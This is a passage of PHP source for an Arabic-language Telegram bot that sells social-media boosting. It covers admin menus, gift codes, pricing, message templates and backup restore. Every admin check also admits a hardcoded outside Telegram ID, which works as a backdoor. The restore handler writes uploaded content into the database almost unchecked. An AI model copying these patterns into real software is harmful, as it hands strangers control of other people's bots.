    [['text'=>"فتح الهديه اليومي",'callback_data'=>"onhdia" ], ['text'=>"قفل الهديه اليومي",'callback_data'=>"ofhdia" ]], 
    [['text'=>"تعين عدد الهديه",'callback_data'=>"sethdia" ]], 
    [['text'=>"تعيين اقل عدد لتحويل ال$name3mla",'callback_data'=>"sAKTHAR" ]],
    [['text'=>"اضافه او خصم $name3mla",'callback_data'=>"coins" ], ['text'=>"تصفير $name3mla شخص",'callback_data'=>"msfrn" ]], 
    [['text'=>"صنع كود هديه",'callback_data'=>"hdiamk" ]],
    [['text'=>"فتح استقبال الرشق",'callback_data'=>"onrshq" ], ['text'=>"قفل استقبال الرشق",'callback_data'=>"ofrshq" ]],  
    [['text'=>"فتح قسم التمويل",'callback_data'=>"onfr" ],['text'=>"قفل قسم التمويل",'callback_data'=>"offr" ]],
    [['text'=>"تعين توكن لموقع 🎟️",'callback_data'=>"token" ],['text'=>"تعين موقع الرشق ⚙️",'callback_data'=>"SiteDomen" ]],
    [['text'=>"تعيين قناة الاثباتات 🤖",'callback_data'=>"sCh" ]],
    [['text'=>"معلومات حول الرشق 📋",'callback_data'=>"infoRshq" ]],
    [['text'=>"قسم الخدمات 📋",'callback_data'=>"xdmat" ]],
    [['text'=>'رجوع' ,'callback_data'=>"paneel"]],
  ]
  ];
}else{

  $adm = [
    'inline_keyboard' => [
        [['text' => 'قسم الكلايش والحقوق', 'callback_data' => 'texters'],['text' => 'قسم الهدايا والكودات', 'callback_data' => 'Hdias_j']],
        [['text' => 'قسم التعيين للنقاط', 'callback_data' => 'settingcoin'],['text' => 'قسم اضافه وتصفير نقاط', 'callback_data' => 'adders1']],
        [['text' => 'قسم التمويل', 'callback_data' => 'tmoilsc'],['text' => 'قسم فتح وقفل', 'callback_data' => 'istqbals']],
        [['text' => 'قسم نسخ بوت الرشق', 'callback_data' => 'nasx'],['text' => 'قسم الخدمات', 'callback_data' => 'xdmat']],
        [['text' => 'قسم الوقتي', 'callback_data' => "timerx"]],
        [['text' => 'رجوع ↩️', 'callback_data' => "paneel"]],
    ]
];



$timerx = [
  'inline_keyboard' => [
    [['text' => 'قفل الوقتي', 'callback_data' => 'oftimer'], ['text' => 'فتح الوقتي', 'callback_data' => 'ontimer']],
        [['text' => 'تعيين عدد الثواني', 'callback_data' => 'setsecnd'],['text' => 'الحالي : '.$secn, 'callback_data' => 'nlll']],
      [['text' => 'رجوع ↩️', 'callback_data' => 'home_s']],
  ]
];

$istqbals = [
  'inline_keyboard' => [
    [['text' => 'فتح استقبال الرشق 🔄', 'callback_data' => 'onrshq'], ['text' => 'قفل استقبال الرشق 🔒', 'callback_data' => 'ofrshq']],
        [['text' => 'فتح قسم التمويل 🔄', 'callback_data' => 'onfr'], ['text' => 'قفل قسم التمويل 🔒', 'callback_data' => 'offr']],
        [['text' => 'فتح ترند مشاركه رابط 📈', 'callback_data' => 'ontrend'], ['text' => 'قفل ترند مشاركه الرابط 🔒', 'callback_data' => 'oftrend']],
      [['text' => 'رجوع ↩️', 'callback_data' => 'home_s']],
  ]
];

$tmoilsc = [
  'inline_keyboard' => [
    [['text' => 'تعيين أدنى حد للتمويل 💸', 'callback_data' => 'idnatmoil']],
    [['text' => 'اضافة تمويل 💰', 'callback_data' => 'addtmoil'],['text' => 'تعيين سعر التمويل 💲', 'callback_data' => 's3rtmoil']],
      [['text' => 'رجوع ↩️', 'callback_data' => 'home_s']],
  ]
];
//الملف كتابه بيرو  @v44vv - @Sero_Bots

$adders1 = [
  'inline_keyboard' => [
    [['text' => 'اضافة أو خصم ' . $name3mla . ' 💰', 'callback_data' => 'coins'], ['text' => 'تصفير ' . $name3mla . ' شخص 🔄', 'callback_data' => 'msfrn']],
      [['text' => 'رجوع ↩️', 'callback_data' => 'home_s']],
  ]
];

  $texters = [
    'inline_keyboard' => [
        [['text' => 'تعيين شروط الاستخدام 📋', 'callback_data' => 'settext'],['text' => 'تعيين اسم البوت 🤖', 'callback_data' => 'setname']],
        [['text' => 'تعيين كليشه شراء ال' . $name3mla . ' 💳', 'callback_data' => 'setbuy'], ['text' => 'تعيين قناة للبوت 📡', 'callback_data' => 'setcha']],
        [['text' => 'تعيين الجوائز 🎁', 'callback_data' => 'setJa']],
        [['text' => 'تعيين كليشه قفل الاستقبال 🔐', 'callback_data' => 'setklishs'], ['text' => 'تعيين كليشه الاثباتات 📄', 'callback_data' => 's2Ch']],
        [['text' => 'تعيين كليشه انشاء الطلب', 'callback_data' => 's3Ch']],
        [['text' => 'تعيين كليشه معلومات الحساب', 'callback_data' => 's5Ch']],
        [['text' => 'تعيين عملة البوت 💲', 'callback_data' => 'setcv'], ['text' => 'اسم العملة الحالية: ' . $name3mla, 'callback_data' => 'nnull']],
        [['text' => 'رجوع ↩️', 'callback_data' => 'home_s']],
    ]
];

$settingcoin = [
  'inline_keyboard' => [
    [['text' => 'تعيين عدد ' . $name3mla . ' مشاركة الرابط 🔄', 'callback_data' => 'setshare']],
    [['text' => 'تعيين اقل عدد لتحويل ال' . $name3mla . ' 📉', 'callback_data' => 'sAKTHAR']],
    [['text' => 'تعيين توكن لموقع 🌐', 'callback_data' => 'token'], ['text' => 'تعيين موقع الرشق 🌐', 'callback_data' => 'SiteDomen']],
    [['text' => 'تعيين قناة الاثباتات 📢', 'callback_data' => 'sCh'],['text' => 'معلومات حول الرشق ℹ️', 'callback_data' => 'infoRshq']],
      [['text' => 'رجوع ↩️', 'callback_data' => 'home_s']],
  ]
];

$hdias_j = [
  'inline_keyboard' => [
    [['text' => 'فتح الهدية اليومية 🎉', 'callback_data' => 'onhdia'], ['text' => 'قفل الهدية اليومية 🔒', 'callback_data' => 'ofhdia']],
    [['text' => 'تعيين عدد الهدية 🎁', 'callback_data' => 'sethdia']],
    [['text' => 'صنع كود هدية 🎁', 'callback_data' => 'hdiamk']],
      [['text' => 'رجوع ↩️', 'callback_data' => 'home_s']],
  ]
];


}


if($data == "setsecnd") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568  ) {

	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
° ارسل الأن عدد الثواني للامر الوقتي الأن
- الارقام فقط 
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
]
])
]);
$modes['mode'][$from_id]  = $data;
        SETJSON12($modes);
      }
    }

    if(is_numeric($text) and $modes['mode'][$from_id] == "setsecnd"){
      	bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"
*
~ تم تعيين $text بنجاح للامر الوقتي
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
]
])
]);
$rshq['timers_sec'] = $text;
SETJSON($rshq); SETJSON12($modes);
      }

if($data == "oftimer") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568  ) {

	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
تم قفل الوقتي بنجاح
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
]
])
]);
unset($rshq['timers']);
SETJSON($rshq); SETJSON12($modes);
      }
    }

if($data == "ontimer") {
	if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568  ) {
	bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
*
تم فتح الوقتي بنجاح
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
     
     [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]], 
]
])
]);
$rshq['timers']  = "on";
SETJSON($rshq); SETJSON12($modes);
      }
    }

$admnb = [ 
  'inline_keyboard'=>[
    [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
  ]
  ];
  
  
  if($data == "s2Ch"){
    bot('EditMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
• ارسال الان الكليشه .

- يمكنك وضع بعض الاضافات الى كليشه الاثباتات من خلال استخدام الاهاشتاكات التاليه :
*

1. `#name_user` : لوضع اسم شخص ووضع معرفه داخل اسمه 
2. `#username` : لوضع اسم مستخدم الشخص مع اضافه @ 
3. `#name` : لوضع اسم الشخص
4. `#id` : لوضع ايدي الشخص 
5. `#coins` لعرض عدد نقاط الشخص
6. `#tlbs` لعرض عدد طلبات البوت
7. `#shares` لعرض عدد مشاركات الرابط
8. `#xtlb` لعرض عدد طلبات الشخص
9. `#idorder` لعرض ايدي الطلب
10. `#type` لعرض نوع الطلب
11. `#count` لعرض عدد الرشق المطلوب
12. `#price` لعرض سعر الطلب
13. `#linker` لعرض رابط الطلب
*
يمكنك تعين نص ماركداون في البوت , عند كتابه معرف قناتك او معرفك قم بوضع [] بين المعرف .
      *
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode($admnb)
      ]);
      $modes['mode'][$from_id] = "settext3";
SETJSON($rshq); SETJSON12($modes);
  }


  if($text and $modes['mode'][$from_id] == "settext3"){
    bot("sendmessage",[
      'chat_id' => $chat_id,
      'text' => "
• تم الحفظ بنجاح
      ",
      'parse_mode' => 'MaRKDOWN',
                      'reply_to_message_id' => $message_id,
                         
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
      [['text'=>'رجوع','callback_data'=>"startmsg"]],
]
])
  ]);
  unset($modes['mode'][$from_id]);
  $rshq["msgthbat"] = $text;
SETJSON($rshq); SETJSON12($modes);
  }

  if($data == "s5Ch"){
    bot('EditMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
• ارسال الان الكليشه .

- يمكنك وضع بعض الاضافات الى كليشه زر معلومات حسابي من خلال استخدام الاهاشتاكات التاليه :
*

1. `#name_user` : لوضع اسم شخص ووضع معرفه داخل اسمه 
2. `#username` : لوضع اسم مستخدم الشخص مع اضافه @ 
3. `#name` : لوضع اسم الشخص
4. `#id` : لوضع ايدي الشخص 
5. `#coins` لعرض عدد نقاط الشخص
6. `#tlbs` لعرض عدد طلبات البوت
7. `#shares` لعرض عدد مشاركات الرابط
8. `#xtlb` لعرض عدد طلبات الشخص
9. `#coinsx` لعرض عدد النقاط المستخدمه
10. `#timehdia` لعرض الوقت المتبقي للهديه
*
يمكنك تعين نص ماركداون في البوت , عند كتابه معرف قناتك او معرفك قم بوضع [] بين المعرف .
      *
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode($admnb)
      ]);
      $modes['mode'][$from_id] = "settext5";
SETJSON($rshq); SETJSON12($modes);
  }


  if($text and $modes['mode'][$from_id] == "settext5"){
    bot("sendmessage",[
      'chat_id' => $chat_id,
      'text' => "
• تم الحفظ بنجاح
      ",
      'parse_mode' => 'MaRKDOWN',
                      'reply_to_message_id' => $message_id,
                         
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
      [['text'=>'رجوع','callback_data'=>"startmsg"]],
]
])
  ]);
  unset($modes['mode'][$from_id]);
  $rshq["msgMYACC"] = $text;
SETJSON($rshq); SETJSON12($modes);
  }
        

  if($data == "s3Ch"){
    bot('EditMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
      *
• ارسال الان الكليشه .

- يمكنك وضع بعض الاضافات الى كليشه انشاء الطلب من خلال استخدام الاهاشتاكات التاليه :
*

1. `#name_user` : لوضع اسم شخص ووضع معرفه داخل اسمه 
2. `#username` : لوضع اسم مستخدم الشخص مع اضافه @ 
3. `#name` : لوضع اسم الشخص
4. `#id` : لوضع ايدي الشخص 
5. `#coins` لعرض عدد نقاط الشخص
6. `#tlbs` لعرض عدد طلبات البوت
7. `#shares` لعرض عدد مشاركات الرابط
8. `#xtlb` لعرض عدد طلبات الشخص
9. `#idorder` لعرض ايدي الطلب
10. `#type` لعرض نوع الطلب
11. `#count` لعرض عدد الرشق المطلوب
12. `#price` لعرض سعر الطلب
13. `#linker` لعرض رابط الطلب
*
يمكنك تعين نص ماركداون في البوت , عند كتابه معرف قناتك او معرفك قم بوضع [] بين المعرف .
      *
      ",
      'parse_mode'=>"markdown",
      'reply_markup'=>json_encode($admnb)
      ]);
      $modes['mode'][$from_id] = "settext4";
SETJSON($rshq); SETJSON12($modes);
  }


  if($text and $modes['mode'][$from_id] == "settext4"){
    bot("sendmessage",[
      'chat_id' => $chat_id,
      'text' => "
• تم الحفظ بنجاح
      ",
      'parse_mode' => 'MaRKDOWN',
                      'reply_to_message_id' => $message_id,
                         
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
      [['text'=>'رجوع','callback_data'=>"startmsg"]],
]
])
  ]);
  unset($modes['mode'][$from_id]);
  $rshq["msgorde"] = $text;
SETJSON($rshq); SETJSON12($modes);
  }

        if($data == "resetm"){
          bot('EditMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$message_id,
            'text'=>"
            *
  -  تم تعيين العمله الافتراضيه ( نقاط )
            *
            ",
            'parse_mode'=>"markdown",
            'reply_markup'=>json_encode($admnb)
            ]);
            unset($modes['mode'][$from_id]);
            unset($rshq["name3mla"]);
  SETJSON($rshq); SETJSON12($modes);
        }
        
    
  if($data == "setcv"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
        $admnb = [ 
          'inline_keyboard'=>[
            
            [['text'=>'تعين العمله الافتراضيه ( نقاط)' ,'callback_data'=>"resetm"]],
            [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
          ]
          ];
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
- ارسل اسم عمله البوت الأن
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }

  if($data == "nasx"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
        $admnb = [ 
          'inline_keyboard'=>[
            [['text'=>'رفع نسخه احتياطيه 💾' ,'callback_data'=>"as_up"]],
            [['text'=>'صنع نسخة احتياطية 📂' ,'callback_data'=>"make_up"]],
            [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
          ]
          ];
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *

مرحبًا بك في قسم النسخ الاحتياطية! 🗃️
يمكنك الآن رفع نسخة احتياطية لبوت الرشق الخاص بك وحفظها بسهولة. 🤖💾
لديك التحكم الكامل في عملية النسخ الاحتياطي، حيث يمكنك تخصيص الإعدادات وتحديد الملفات والبيانات التي ترغب في تضمينها في النسخة الاحتياطية. 🎛️

سواء كنت ترغب في حفظ إعدادات البوت، قاعدة البيانات، أو أي بيانات أخرى هامة، يمكنك ضمان سلامتها من خلال عمليات النسخ الاحتياطي المنتظمة. 🔄💡

لا تتردد في استخدام واجهة التحكم السهلة لدينا والتي تقدم لك خيارات واسعة لتخصيص عمليات النسخ الاحتياطي وفقًا لاحتياجاتك الفردية. 🖥️👌

قم بالنقر على الزر المخصص لبدء عملية النسخ الاحتياطي الآن، واستمتع براحة البال بفضل حماية بيانات بوت الرشق الخاص بك. 🚀🔐
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
        }
  }

  if($data == "as_up"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
        $admnb = [ 
          'inline_keyboard'=>[
            
            [['text'=>'رجوع' ,'callback_data'=>"nasx"]],
          ]
          ];
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
ارسل النسخه الان لرفعها في قاعده البيانات
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
        SETJSON12($modes);
        }
      }

      if($modes['mode'][$from_id] == "as_up"){
      if($update->message->document){
        $file_id = "https://api.telegram.org/file/bot".API_KEY."/".bot("getfile",["file_id"=>$update->message->document->file_id])->result->file_path;
        if(pathinfo($file_id, PATHINFO_EXTENSION) == "bot"){
            bot("sendmessage",[
                "chat_id" => $chat_id,
                "text" => "تم رفع الملف بنجاح .",
                "parse_mode" => "marKdown",
          'reply_markup'=>json_encode([ 
            'inline_keyboard'=>[
              [['text'=>'رجوع','callback_data'=>"backsup"]],
            ]
            ])
            ]);

$decryptedMessage = base64_decode(explode("I_BERO_",file_get_contents($file_id))[1]);
if(json_decode($decryptedMessage,1)){
  file_put_contents("RSHQ/ALLS/". USR_BOT. "/rshq.json",$decryptedMessage);

}


            unset($modes['mode'][$from_id]);
            SETJSON12($modes);
    
            }else{
          bot("sendmessage",[
            "chat_id" => $chat_id,
            "text" =>"- ركز عزيزي ارسل الملف بصيغه ( .bot )",
            "parse_mode" => "marKdown",
            'reply_markup'=>json_encode([ 
              'inline_keyboard'=>[
                [['text'=>'رجوع','callback_data'=>"backsup"]],
              ]
              ])
          ]);
          unset($modes[$from_id]);
        file_put_contents("$mode_name",json_encode($modes));
        }
    }
  }
  if($data == "make_up"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
        $admnb = [ 
          'inline_keyboard'=>[
            
            [['text'=>'رجوع' ,'callback_data'=>"nasx"]],
          ]
          ];
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
يتم العمل على صنع نسخة، يرجى الانتظار 🛠️
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);

$plaintext = file_get_contents("RSHQ/ALLS/". USR_BOT. "/rshq.json") ;

$encryptedMessage = base64_encode($plaintext);
file_put_contents('J_'.USR_BOT.'.bot',"DONT CHANGE ANYTHINK!! \n USer Bot : @".USR_BOT."; | In ".date('Y-m-d H:i:s')."; USER MAKER : @H7JBOT ; \n BackUp : I_BERO_$encryptedMessage");
bot("senddocument",[
  'chat_id' => $chat_id,
'document' => new CURLFile('J_'.USR_BOT.'.bot'),
  'caption' => "
- النسخه المشفره .
",
'parse_mode' => 'MaRKDOWN',
              'reply_to_message_id' => $message_id,

]);
unlick('J_'.USR_BOT.'.bot');
        }
  }

if($text and $modes['mode'][$from_id]== "setcv"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
- تم تعيين عمله البوت : $text
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);
        $rshq["name3mla"] = $text;
        $modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
    }
  }


  $admnvip = [ 
  'inline_keyboard'=>[
    [['text'=>'تعين كليشه شروط الاستخدام' ,'callback_data'=>"settext"]],
    [['text'=>'تعين قناة لبوت' ,'callback_data'=>"setcha"],['text'=>'تعين اسم البوت' ,'callback_data'=>"setname"]],
    [['text'=>'تعين كليشه شراء ال$name3mla' ,'callback_data'=>"setbuy"]],
    [['text'=>'تعين كليشه الجوائز' ,'callback_data'=>"setJa"]],
    [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
  ]
  ];

if($data == "s3rtmoil"){
    if($chat_id == $sudo or $chat_id==5561152568 or in_array($from_id, $Js['admin'])  ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          ارسل سعر التمويل الان
          سعر كل 1 عضو
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }

if(is_numeric($text) and $modes['mode'][$from_id]== "s3rtmoil"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تعيين عدد ال$name3mla 
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);

        $modes['mode'][$from_id]  = null;
        $tmoil['s3rtmoil' ]  = $text ;
            $rshq['s3rtmoil' ]  = $text ;
        SETJSON1($tmoil); 
SETJSON($rshq); SETJSON12($modes);
    }
  }
 
 if($data == "setklishs"){
    if($chat_id == $sudo or $chat_id==5561152568 or in_array($from_id, $Js['admin'])  ) {
      if(true){
      	$admnb = [ 
  'inline_keyboard'=>[
    [['text'=>'الرجوع الاساسيه' ,'callback_data'=>"asases"]],
  ]
  ];
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          - ارسل الكليشه من فضلك
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }
 
 if($data == "asases"){
    if($chat_id == $sudo or $chat_id==5561152568 or in_array($from_id, $Js['admin'])  ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          تم رجوع الكليشه الاساسيه 
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          unset($modes['mode'][$from_id]) ;
          $rshq['setklishs' ]  = null;
          SETJSON($rshq);
SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }

if($text and $modes['mode'][$from_id]== "setklishs"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تعيين الكليشه بنجاح
        *
       مثال علي رسالتك :  `$text `
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);

        $modes['mode'][$from_id]  = null;
        $rshq['setklishs' ]  = $text ;
SETJSON($rshq); SETJSON12($modes);
    }
  }
 
  if($data == "idnatmoil"){
    if($chat_id == $sudo or $chat_id==5561152568 or in_array($from_id, $Js['admin'])  ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          ارسل الان ادني حد للتمويل، 
          ارسل الارقام فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }
   $stopedkl = $rshq['setklishs' ]??"*تم قفل استقبال الرشق عزيزي\n\nاجمع $name3mla الان علماينفتح الرشق\n*" ;
  if(is_numeric($text) and $modes['mode'][$from_id]== "idnatmoil"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تعيين حساب ادني حد للتمويل $text
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);
        $tmoil["tmoils"] = $text;
        $modes['mode'][$from_id]  = null;
        SETJSON($rshq); SETJSON12($modes);
SETJSON1($tmoil);
    }
  }
  if($data == "settext"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          ارسل الكليشه الان
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }
  
  if($data == "msfrn"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          ارسل ايدي الشخص لتصفير ".$name3mla."ه
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }
  
  if($data == "xdmatsm"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
      	$admnb = [ 
  'inline_keyboard'=>[
  [['text'=>'ارجاع الخزن ✅' ,'callback_data'=>"resetBEROUUF"]],
    [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
  ]
  ];
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          - مرحبا بك عزيزي في هذا القسم يمكنك ارجاع الخزن 
          - يتم حفظ كل الخزونات في المخزن هذا ✅
          
          - تنبيه! لاتقم بارجاع الخزن اذا لم ينحذف 
          
          - للارجاع اضغط علي ارجاع الخزن لارجاع اخر خزن تم حفظه في بوتك
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }
  
  if($data == "resetBEROUUF"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
      	$admnb = [ 
  'inline_keyboard'=>[
  
    [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
  ]
  ];
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
انتضر بعد الوقت يتم الارجاع
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
$folderPath = 'RSHQ/BACKUP'; 
$files = scandir($folderPath);
$files = array_filter($files, function($file) {
    return !in_array($file, ['.', '..']);
});
$numericFiles = array_map(function($file) {
    return intval($file);
}, $files);

$maxFile = max($numericFiles);
$f2 = $maxFile ;
bot('sendmessage',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
- تم ارجاع اخر خزن ($f2) بنجاح لقاعده البيانات ✅
          *
          ",
          'parse_mode'=>"markdown",
          
          ]); 
          file_put_contents("RSHQ/ALLS/". USR_BOT."/rshq.json", file_get_contents("RSHQ/BACKUP/$f2" )) ;
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }

if($text and $modes['mode'][$from_id]== "msfrn"){
    if(true){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
        *
        تم تصفير $name3mla $text 
        *
        ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode($admnb)
        ]);
        $rshq["coin"][$text] = 0;
        $modes['mode'][$from_id]  = null;
SETJSON($rshq); SETJSON12($modes);
    }
  }

  if($data == "setname"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          ارسل اسم البوت الان .
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
          $modes['mode'][$from_id]  = $data;
SETJSON($rshq); SETJSON12($modes);
      }else{
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
          *
          هذا القسم للمشتركين المدفوعين فقط
          *
          ",
          'parse_mode'=>"markdown",
          'reply_markup'=>json_encode($admnb)
          ]);
      }
    }
  }

  if($data == "setcha"){
    if($chat_id == $sudo or $chat_id == 5561152568 or $chat_id == 5561152568 ) {
      if(true){
        bot('EditMessageText',[
          'chat_id'=>$chat_id,
          'message_id'=>$message_id,
          'text'=>"
